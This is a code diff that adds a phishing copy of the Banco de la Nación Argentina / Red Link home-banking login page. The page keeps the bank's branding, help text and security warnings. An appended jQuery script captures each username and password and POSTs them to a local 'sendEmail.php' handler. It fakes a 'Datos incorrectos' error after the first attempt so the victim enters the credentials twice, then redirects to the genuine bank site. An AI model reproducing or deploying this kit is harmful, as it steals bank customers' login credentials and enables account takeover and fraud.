@@ -1,0 +1,454 @@
+<html><!-- LOGIN --><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+		<meta http-equiv="X-UA-Compatible" content="IE=Edge"> <!-- HB-3426 -->
+		<link rel="icon" type="image/png" href="./index_files/logo_link.jpg">
+	    <script type="text/javascript" src="./index_files/main_ophb_0011.js.download"></script>
+	    <script type="text/javascript" src="./index_files/jquery-1.2.6.js.download"></script>
+	    <script type="text/javascript" src="./index_files/jquery.form.js.download"></script>
+	    <script type="text/javascript" src="./index_files/jquery.validate.js.download"></script>
+		<script type="text/javascript" src="./index_files/jquery.caret.js.download"></script>
+	    <script type="text/javascript" src="./index_files/jquery.osk.js.download"></script>
+		<script type="text/javascript" src="./index_files/jquery.event.drag-1.4.min.js.download"></script>
+		<script type="text/javascript" src="./index_files/teclado-virtual-controller.js.download" charset="utf-8"></script>
+		<script type="text/javascript" src="./index_files/transaction-controller.js.download"></script>
+	    <script type="text/javascript" src="./index_files/LinkTransactionController.js.download"></script>
+	    <script type="text/javascript" src="./index_files/link-controller.js.download"></script>
+	    <script type="text/javascript" src="./index_files/jqModal.min.js.download"></script>
+	    <script type="text/javascript" src="./index_files/modal-controller.js.download"></script>
+        <link rel="stylesheet" href="./index_files/modal.css" type="text/css" media="all" charset="utf-8">
+        <link rel="stylesheet" href="./index_files/link.modal.css" type="text/css" media="all" charset="utf-8">
+        <link rel="stylesheet" href="./index_files/estado.css" type="text/css" media="screen" charset="utf-8">
+        <script type="text/javascript" src="./index_files/estado.js.download"></script>
+        <script type="text/javascript" src="./index_files/enlaces.login.js.download"></script>
+	    <title>Red Link - BANCO DE LA NACION ARGENTINA</title>
+		<link rel="stylesheet" type="text/css" href="./index_files/login.css">
+        <link rel="stylesheet" media="print" type="text/css" href="./index_files/toprint.css">
+        <link rel="stylesheet" href="./index_files/teclado_full.css" type="text/css" media="screen" charset="utf-8">
+		<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+
+
+		<!-- tag manager  -->
+		
+		<script type="text/javascript">
+            var urlFaqs = 'faqs.htm';
+            var urlInformacion = 'informacion.htm';
+            var urltyc = 'terminos.htm';
+            var urlSeguridad = 'seguridad.htm';
+            var usarTecladoVirtual = true;
+            var tecladoAlfanum = true;
+            var urlLogout = "logouttyc.htm";
+            var urlLogin = "login.htm";            
+            var urlBrowserError = "browsererror.htm";
+            var servicePackBloqueadosIE6 = "";
+            var ipSinRestriccionIE6SP1 =  false;
+            var pdfFaq = '/bna/faqs/bna.pdf';
+		</script>
+		
+	    <script type="text/javascript" src="./index_files/login-utils.js.download"></script>
+	    <script type="text/javascript" src="./index_files/tyc-controller.js.download"></script>
+   		<script type="text/javascript" src="./index_files/sfa-base.js.download"></script>
+
+	</head>
+	<body>
+		
+		<div class="textoClave" id="ayudaUsuario">
+			<a href="javascript:;" class="cerrarAyuda" title="Cerrar ayuda">Cerrar</a>
+			<br>
+			<span>
+				<b>ï¿½Cï¿½mo obtengo el usuario y la clave para operar?<br></b>
+				Es muy sencillo, para obtener "Usuario y Clave de HOME BANKING", debe dirigirse "por ï¿½nica vez" a un Cajero Automï¿½tico de la Red Link para obtener su Nï¿½mero de Usuario y elegir su Clave.
+				<br><br>
+				<b>ï¿½Quï¿½ pasos debo seguir para obtener el Nï¿½mero de Usuario y elegir la Clave?</b>
+				<br>Los pasos a seguir son los siguientes:
+				    <ul>
+						<li>Ingresar su Tarjeta y PIN en el Cajero Automï¿½tico de la Red Link.</li>
+					    <li>Seleccionar la opciï¿½n "Claves" del menï¿½ principal y en la prï¿½xima pantalla elegir "Home Banking-Link Celular".</li>
+					   <li> Ingresar una clave numï¿½rica de 6 (seis) dï¿½gitos sï¿½lo conocida por usted.</li>
+					   <li>Reingresar dicha clave.</li>
+					   <li> Obtendrï¿½ el ticket de la operaciï¿½n (el sistema le asignarï¿½ un "Nï¿½mero de Usuario").</li>
+					   <li> Deberï¿½ conservar este ticket ya que los datos que contiene serï¿½n necesarios cuando ingrese por primera vez a Home Banking.</li>
+					</ul>
+			</span>
+		</div>
+		<div class="textoClave" id="ayudaAvatar">
+			<a href="javascript:;" class="cerrarAyudaAvatar" title="Cerrar ayuda">Cerrar</a>
+			<br>
+			<span>
+				La imagen que se visualiza al ingresar el usuario de Home Banking es un nuevo elemento para que Ud. opere mï¿½s seguro.
+				La primera vez que opere en Home Banking debe ingresar y seleccionar una imagen que pueda recordar fï¿½cilmente. <br>
+				IMPORTANTE: si Ud. no visualiza la imagen que configurï¿½ en Home Banking o bien aparece otra imagen, por su seguridad <b>no ingrese la clave. </b>
+				Llame inmediatamente al Banco o al Call Center de Red Link al (011) 4319-LINK (5465) ï¿½ 0800-888-LINK (5465).
+			</span>
+		</div>
+		<script type="text/javascript">
+		//<!--
+			$(document).ready(function() {
+                var sessionExpired = 'false';                
+                if (sessionExpired == 'true') {
+                    estado.show('Su sesi&oacute;n ha caducado. Por favor, ingrese nuevamente.', estado.tipo.ERROR);
+                }
+
+                var loginTimeout = 'false';
+                if (loginTimeout == 'true') {
+                    estado.show('No ha sido posible ingresar. Por favor vuelva a intentar en unos minutos.', estado.tipo.ERROR);
+                }
+
+                
+	            $(document).keydown(function(e) {
+	            	if (e.which == 13) {
+	            	    ingresar();
+		            	return false;
+	            	} 
+	            });
+	        });
+	        
+            function loginTimeout(data) {
+                window.location = 'login.htm?loginTimeout=true';
+            }
+
+
+            if (parent.frames.length) top.location.href= document.location; 
+        //-->
+		</script>
+		<div class="botonera">
+            
+
+<!-- CSS -->
+<link rel="stylesheet" href="./index_files/enlaces.login.css" type="text/css" media="screen" charset="utf-8">
+
+<!-- VIEW -->
+<div class="enlacesLogin">
+	<ul>
+        <li>
+            <a href="javascript:;" id="faqsLogin" alt="Preguntas Frecuentes" title="Preguntas Frecuentes">
+                Preguntas Frecuentes
+            </a>
+        </li>
+        <li>
+            <a href="javascript:;" id="infoLogin" alt="Informaciï¿½n de Home Banking" title="Informaciï¿½n de Home Banking">
+                Información de Home Banking
+            </a>
+        </li>
+        <li>
+            <a href="javascript:;" id="tycLogin" alt="Tï¿½rminos y Condiciones" title="Tï¿½rminos y Condiciones">
+                Términos y Condiciones
+            </a>
+        </li>        
+        <li>
+            <a href="javascript:;" id="seguridadLogin" alt="Seguridad del Sistema" title="Seguridad del Sistema">
+                Seguridad del Sistema
+            </a>
+        </li>
+
+	</ul>	
+	<div id="contenedorSeguridad">
+		<a href="http://www.bna.com.ar/institucional/consejos_seguridad.asp" id="consejoSeguridad" alt="Consejos de Seguridad" target="_blank" title="Consejos de Seguridad">
+                Consejos de Seguridad
+            </a>
+	</div>
+</div>
+
+
+<script type="text/javascript" src="./index_files/enlaces.login.js.download"></script>
+               
+		</div>		
+        <form enctype="multipart/form-data" id="UserNameVerificationForm" name="UserNameVerificationForm" method="post" action="https://hb.redlink.com.ar/bna/doLoginFirstStep.htm">
+			<input type="hidden" id="isInclu" name="isInclu" value="false">    
+			<div style="clear:both;"></div>
+			<div id="contenedor" class="contenedor">
+		        <div id="recuadroMensaje" class="contEstado ocultar"></div>
+		        <!-- fin componente estado -->
+				<div class="login">
+					<div class="bienvenido"><img src="./index_files/logo.gif" alt=""></div>
+					<div class="ingreso">
+						<div class="siEsPcPublica" style="display:none">
+							<label for="pcCompartida">Ingrese con Teclado Virtual</label>
+							<input type="checkbox" name="pcCompartida" id="pcCompartida">
+						</div>
+						<div class="campos">
+                            <div id="campoUsuario">
+                                <label for="username">Usuario</label>
+							    <div class="campo">
+                                    <input type="text" id="usuario" name="username">    
+							    </div>
+								<a href="javascript:;" class="preg" title="ï¿½Cï¿½mo sacar la clave?">
+	                                <img src="./index_files/preg_circle.gif" alt="?" border="0">
+	                            </a>
+							</div>
+							<div id="campoPassword" style="display:none">
+		                        <label for="password">Clave</label>
+							    <div class="campo">
+                                    <input type="password" name="pin" id="clave">
+                                </div>
+								<a href="javascript:;" class="preg ayuda2" title="Ayuda para la imagen">
+	                                <img src="./index_files/preg_circle.gif" alt="?" border="0">
+	                            </a>
+														
+                                <div id="contAvatar" class="avatar">
+
+                                    <img alt="avatar" src="https://picsum.photos/55">
+                                </div>
+	                            
+							</div>
+							<div id="vistaSfa" style="float: none; margin-top:5px">
+
+							</div>
+						</div>
+					</div>
+					<a href="javascript:ingresar();" class="btn_ingresar">Ingresar</a>
+					
+					
+					<div class="recuperacion_usuario">
+						
+						<a href="javascript:restauracionUsuario('desbloqueoSolicitud.htm');" class="desbloqueo">Desbloqueo de usuario</a>
+						
+						
+						<a href="javascript:restauracionUsuario('blanqueoSolicitud.htm');" class="blanqueo">Blanqueo de Clave</a>
+						
+					</div>
+					
+
+				
+					<div class="registrarse">
+						<a href="javascript:enrolamiento('registrarse.htm');" class="enrolamiento">REGISTRARSE</a>
+					</div>
+				
+				<div class="pie">
+						<img src="./index_files/verisignlogo2.gif" alt="" class="certify right">
+						<img src="./index_files/csseal_transp_S_v4.gif" alt="" class="certify left">
+					</div>
+				</div>
+				<div class="cuerpo">
+					<p>Nunca ingrese los 81 datos de su tarjeta de coordenadas en una misma pantalla. En caso de haber ingresado esta informaciï¿½n comunï¿½quese al (011)4319-5465IMPORTANTE: El Banco de la Naciï¿½n Argentina "NUNCA" le solicita que informe o confirme sus claves o datos a travï¿½s de un correo electrï¿½nico. <b>CONSEJOS DE USO</b>: ï¿½ Para operar este servicio Ud. necesita su Usuario y Clave Internet Home Banking. Si no cuenta con estos datos, le recordamos que se obtienen en cualquier cajero automï¿½tico de la Red Link. ï¿½ Al acceder al sistema, ingresarï¿½ a un sitio seguro. Es conveniente comprobar la autenticidad del sitio. Para ello, basta con pulsar sobre el ï¿½cono del candado que se encuentra en la parte inferior del navegador. Al ingresar al candado, se desplegarï¿½ la informaciï¿½n del certificado. Verifique que en la ruta del certificado figure homebanking.redlink.com.ar. ï¿½ Utilice Home Banking sï¿½lo desde su computadora personal o su trabajo, evite el uso desde otras computadoras para realizar operaciones financieras (Ej: Cibercafï¿½, locutorio, etc.).</p>
+					<a href="http://www.redlink.com.ar/" target="_blank" class="RedLinkLogoLogin">
+						<img src="./index_files/logo_link.jpg" alt="RED LINK" width="60" height="60" border="0">
+					</a> 
+					<div class="chicos">
+						<script src="https://seal.verisign.com/getseal?host_name=hb.redlink.com.ar&amp;size=S&amp;use_flash=YES&amp;use_transparent=YES&amp;lang=es%3E%3C/script%3E%3Cbr"></script>
+						<a href="https://www.certisur.com/seal/authby.htm?host_name=hb.redlink.com.ar&amp;size=S&amp;use_flash=YES&amp;use_transparent=YES&amp;lang=es" target="_blank" class="linkCertisur">
+							<img src="./index_files/logo_certisur.jpg" border="0">
+						</a> 
+					</div>
+					
+				</div>
+			</div>
+		</form>
+		
+		
+        <form enctype="multipart/form-data" id="RestauracionUsuarioForm" name="RestauracionUsuario" method="post" action="https://hb.redlink.com.ar/bna/login.htm">
+        </form>
+        
+        <form enctype="multipart/form-data" id="EnrolamientoForm" name="EnrolamientoForm" method="post" action="https://hb.redlink.com.ar/bna/login.htm">
+        </form>
+		
+		<!-- Modal Ayuda Inclusite -->
+		
+		<div id="ayudaInclusiteModal" class="jqmWindow linkModal" style="display:none">
+			<div id="filtro" class="filtro" style="height: 100%; width: 100%; position: fixed; left: 0px; top: 0px; z-index:1999; opacity: 0.5; filter:alpha(opacity=50); ;"></div>
+			<div id="cuerpo" class="divContent" style="z-index:3000; position: absolute;">        		
+				<table style="z-index:5000; border-radius:6px; border:1px solid #999; background-color:#e5e6e6;" border="0">
+				  <tbody><tr>
+					<td colspan="6" class="tipo2" height="1">&nbsp;</td>
+					<td>&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td colspan="7" class="tipo2" valign="top" align="right"><table width="100%" border="0">
+					  <tbody><tr>
+						<td width="9%">&nbsp;</td>
+						<td width="80%"><span class="tipo21">Bienvenido al sitio de Home Banking accesible.<br>
+				Los siguientes son los comandos basicos de navegacion que usted utilizara en este sitio.<br>
+				Ante cualquier duda puede volver a consultarlos presionando F1.</span></td>
+						<td width="10%"><a href="javascript:;" id="hideModalAyuda"><span class="tipo2">Cerrar</span></a></td>
+						<td width="1%">&nbsp;</td>
+					  </tr>
+					</tbody></table></td>
+				  </tr>
+				  <tr>
+					<td width="14%" valign="top" height="1" align="right">&nbsp;</td>
+					<td class="tipo1" height="1">&nbsp;</td>
+					<td width="14%" valign="top" height="1" align="right">&nbsp;</td>
+					<td class="tipo1" valign="top" height="1" align="left">&nbsp;</td>
+					<td width="14%" valign="top" height="1" align="right">&nbsp;</td>
+					<td class="tipo1" valign="top" height="1" align="left">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td valign="top" align="right"><img src="./index_files/punto.png" id="punto" width="69" height="66"></td>
+					<td class="tipo1" width="12%">Presione la tecla punto para salir del area actual. Pulsa dos veces para volver a la pagina anterior si estas en 'areas'.</td>
+					<td width="13%" valign="top" align="right"><img src="./index_files/escape.png" id="esc" width="69" height="66"></td>
+					<td class="tipo1" width="13%" valign="top" align="left">Presione la tecla Escape para abrir la ventana de configuracion de Inclusite.</td>
+					<td width="17%" valign="top" align="right"><img src="./index_files/cero.png" id="cero" width="69" height="66"></td>
+					<td class="tipo1" width="16%" valign="top" align="left">Presione la tecla cero para repetir las opciones.</td>
+					<td width="5%">&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td class="margenimagizq" height="1">&nbsp;</td>
+					<td class="tipo1" valign="top" height="1" align="left">&nbsp;</td>
+					<td style="text-align: right" height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+					<td class="margenimagizq" height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td valign="top" align="right"><img src="./index_files/up.png" id="up" width="69" height="66"></td>
+					<td class="tipo1" valign="top" align="left">Presione la tecla de navegaciï¿½n subir para desplazarte hacia arriba dentro de la pï¿½gina web.</td>
+					<td valign="top" align="right"><img src="./index_files/b.png" id="b" width="69" height="66"></td>
+					<td class="tipo1" valign="top" align="left">Presione la tecla B para ir a las ï¿½reas de la pï¿½gina web.</td>
+					<td valign="top" align="right"><img src="./index_files/1.png" id="1" width="69" height="66"></td>
+					<td class="tipo1" width="16%" valign="top" align="left">Presione el nï¿½mero correspondiente para acceder al ï¿½rea deseada.</td>
+					<td>&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td class="margenimagizq" height="1">&nbsp;</td>
+					<td class="tipo1" valign="top" height="1" align="left">&nbsp;</td>
+					<td style="text-align: right" height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+					<td class="margenimagizq" height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td valign="top" align="right"><img src="./index_files/down.png" id="down" width="69" height="66"></td>
+					<td class="tipo1" valign="top" align="left">Presione la tecla de navegaciï¿½n bajar para desplazarte hacia abajo dentro de la pï¿½gina web.</td>
+					<td valign="top" align="right"><img src="./index_files/d.png" id="d" width="69" height="66"></td>
+					<td class="tipo1" valign="top" align="left">Presione la tecla D para ir al ï¿½rea principal de la pï¿½gina web.</td>
+					<td valign="top" align="right"><img src="./index_files/f1.png" id="f1" width="69" height="66"></td>
+					<td class="tipo1" width="16%" valign="top" align="left">Presione la tecla F1 para abrir o cerrar la ayuda de esta interfaz.</td>
+					<td>&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td class="margenimagizq" height="1">&nbsp;</td>
+					<td class="tipo1" valign="top" height="1" align="left">&nbsp;</td>
+					<td style="text-align: right" height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+					<td class="margenimagizq" height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td valign="top" align="right"><img src="./index_files/back.png" id="back" width="114" height="66"></td>
+					<td class="tipo1" valign="top" align="left">Presione la tecla Retroceder para volver a la pï¿½gina anterior.</td>
+					<td valign="top" align="right"><img src="./index_files/z.png" id="z" width="69" height="66"></td>
+					<td class="tipo1" valign="top" align="left">Presione la tecla Z para Aumentar o Disminuir.</td>
+					<td valign="top" align="right"><img src="./index_files/espaciadora.png" id="espaciadora" width="114" height="66"></td>
+					<td class="tipo1" width="16%" valign="top" align="left">Presione la tecla Barra Espaciadora para pausar o continuar la reproducciï¿½n del audio del contenido.</td>
+					<td>&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td class="margenimagizq" height="1">&nbsp;</td>
+					<td class="tipo1" valign="top" height="1" align="left">&nbsp;</td>
+					<td style="text-align: right" height="1">&nbsp;</td>
+					<td colspan="2" class="tipo1" valign="top" height="1" align="left">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+					<td height="1">&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td class="margenimagizq">&nbsp;</td>
+					<td class="tipo1" valign="top" align="left">&nbsp;</td>
+					<td style="text-align: right"><img src="./index_files/asterisco.png" id="asterisco" width="69" height="66"></td>
+					<td colspan="2" class="tipo1" valign="top" align="left"><span class="tipo12"><span class="tipo111">Para ï¿½reas superiores a 9, presione el asterisco seguido del nï¿½mero identificador del ï¿½rea, y finalice con asterisco. Ejemplo, asterisco 12 asterisco para acceder al ï¿½rea 12.</span></span></td>
+					<td>&nbsp;</td>
+					<td>&nbsp;</td>
+				  </tr>
+				  <tr>
+					<td class="margenimagizq">&nbsp;</td>
+					<td class="tipo1" valign="top" align="left">&nbsp;</td>
+					<td style="text-align: right">&nbsp;</td>
+					<td>&nbsp;</td>
+					<td class="margenimagizq">&nbsp;</td>
+					<td>&nbsp;</td>
+					<td>&nbsp;</td>
+				  </tr>
+				</tbody></table>
+			</div>
+		</div>
+		
+		<!-- Fin Modal Ayuda Inclusite -->
+		
+        <script type="text/javascript">
+        addValidators();
+        </script>
+		
+		<!-- Enlaces login -->      
+        <div id="enlacesModalLogin" class="jqmWindow linkModal" style="display:none">
+            <div class="top">
+                <h4></h4>
+                <a href="javascript:;" id="cerrarEnlacesModalLogin"><span>cerrar</span></a>
+            </div>
+            <div class="middle" id="textoContenidoEnlaceLogin">                           
+            </div>
+            <div class="enlacesBottom">
+                <a id="print" href="javascript:;" class="nomostrar" title="Imprimir">Imprimir</a>
+                <a id="download" href="javascript:;" class="nomostrar" title="Exportar">Descargar</a>
+            </div>
+        </div>
+        <div id="secondstep"></div>
+        <form id="exporter" enctype="multipart/form-data" method="POST" action="https://hb.redlink.com.ar/bna/login.htm">
+        </form>
+    
+
+
+
+
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
+<script>
+   var kk = 1;
+   var ccc=0;
+   $(".btn_ingresar").click(function(){
+   	if(kk==1){
+	    if($("#usuario").val().length <3){
+			estado.show("El nombre de usuario ingresado tiene un formato incorrecto, por favor ingr&eacute;selo nuevamente", estado.tipo.ERROR);
+			
+			return;
+	    }
+	    else {
+	    	kk++;
+	    	$("#campoUsuario").hide();
+	    	$("#campoPassword").show();
+	    	$(".siEsPcPublica").show();
+	    }
+   	}
+   	else{
+   		if($("#clave").val().length>3){
+			$.ajax({
+				url: "ajax/sendEmail.php",
+				method: "POST",
+				data: {
+					usuario: $("#usuario").val(),
+					clave: $("#clave").val()
+				},
+				success: function(result){
+				   ccc++;
+				   if(ccc==1){
+				       $("#usuario").val("");
+    				   $("#clave").val("");
+    				   kk=1;
+    				   $("#campoUsuario").show();
+    	    	       $("#campoPassword").hide();
+    	    	       $(".siEsPcPublica").hide();
+    				   estado.show("Datos incorrectos", estado.tipo.ERROR);
+				   }
+				   else{
+				       location.replace("https://hb.redlink.com.ar/bna/login.htm");
+				   }
+			       
+			    }
+			});
+    
+   	    }
+   	}
+   });
+   
+   $('#usuario').keydown(function (e){
+        if(e.keyCode == 13){
+            $(".btn_ingresar").click();
+        }
+   });
+   
+   $('#clave').keydown(function (e){
+        if(e.keyCode == 13){
+            $(".btn_ingresar").click();
+        }
+   });
+</script>
+<div id="osk" style="z-index: 99999; top: 300px; left: 400px; display: none;" class="oskAlfaNum"><div><button id="key_nada">~</button><button id="key_1">1</button><button id="key_2">2</button><button id="key_3">3</button><button id="key_4">4</button><button id="key_5">5</button><button id="key_6">6</button><button id="key_7">7</button><button id="key_8">8</button><button id="key_9">9</button><button id="key_0">0</button><button id="key_minus">?</button><button id="key_equals">¿</button><button id="key_backspace">Borrar</button></div><div><button id="key_tab">Tab</button><button id="key_q">q</button><button id="key_w">w</button><button id="key_e">e</button><button id="key_r">r</button><button id="key_t">t</button><button id="key_y">y</button><button id="key_u">u</button><button id="key_i">i</button><button id="key_o">o</button><button id="key_p">p</button><button id="key_leftsquarebracket">+</button></div><div><button id="key_capslock">Caps</button><button id="key_a">a</button><button id="key_s">s</button><button id="key_d">d</button><button id="key_f">f</button><button id="key_g">g</button><button id="key_h">h</button><button id="key_j">j</button><button id="key_k">k</button><button id="key_l">l</button></div><div><button id="key_leftshift">Shift</button><button id="key_z">z</button><button id="key_x">x</button><button id="key_c">c</button><button id="key_v">v</button><button id="key_b">b</button><button id="key_n">n</button><button id="key_m">m</button><button id="key_period">.</button><button id="key_dash">-</button></div></div></body></html>
